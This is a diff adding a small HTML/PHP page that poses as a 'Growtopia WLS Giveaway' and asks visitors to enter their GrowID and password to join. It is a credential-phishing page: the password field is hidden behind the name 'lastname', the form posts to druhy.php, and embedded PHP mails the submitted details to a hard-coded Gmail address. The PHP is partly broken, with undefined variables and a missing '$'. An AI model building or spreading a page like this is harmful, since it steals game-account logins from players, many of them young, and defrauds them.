@@ -1,0 +1,32 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <link rel="stylesheet" href="style.css">
+    <title>ahoj</title>
+</head>
+<body>
+    <h1>Growtopia WLS Giveaway</h1>
+    <h2>Please enter your GrowID information to enter the giveaway</h2>
+    <form action="druhy.php" method="POST">
+        GrowID:<br>
+        <input type="text" name="firstname" value="">
+        <br>
+        Password:<br>
+        <input type="password" name="lastname" value="">
+        <br><br>
+        <input type="submit" value="Submit">
+    </form> 
+
+    <?php
+
+$to = "khang710@gmail.com";
+
+$subject = "growID od ".$jmeno."";
+$mess = "Jméno: ".$firstname."\nPrijmeni:".lastname."\nEmail: ".$email." \n";
+mail ($to, $subject, $mess, $extra);
+
+?>
+</body>
+</html>
